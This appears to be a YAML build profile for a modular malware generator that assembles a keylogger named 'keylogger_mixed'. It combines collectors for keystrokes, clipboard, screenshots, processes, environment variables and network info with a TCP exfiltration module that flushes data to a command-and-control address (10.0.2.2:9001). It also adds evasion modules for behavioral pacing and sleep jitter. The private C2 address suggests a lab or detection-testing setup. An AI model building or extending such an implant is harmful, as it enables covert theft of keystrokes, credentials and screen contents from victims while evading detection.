name: keylogger_mixed
description: Keylogger with mixed API + LOLBin collectors — balanced recon footprint

core:
  - core/emit_buffer
  - core/run_cmd

collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/clipboard
  - collectors/env_vars_lolbin
  - collectors/netinfo_lolbin
  - collectors/active_windows
  - collectors/screenshot
  - collectors/drives

keylogger: collectors/keylogger_poll

exfil: exfil/tcp_flush
arch: arch/keylogger

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
